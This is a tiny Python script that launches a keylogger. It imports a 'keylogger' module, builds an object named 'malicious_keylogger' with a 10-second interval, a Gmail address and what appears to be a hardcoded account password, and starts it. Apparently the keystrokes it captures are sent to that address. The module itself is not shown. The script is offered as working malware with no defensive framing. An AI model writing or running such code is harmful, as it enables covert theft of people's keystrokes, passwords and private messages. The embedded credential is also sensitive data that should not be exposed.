#!/usr/bin/env python

import keylogger


# Initialize - start keylogger

malicious_keylogger = keylogger.KeyLogger(10, 'testKeylogger@gmail.com', 'G231ur567I@n1M$')

# Execute Keylogger

malicious_keylogger.start()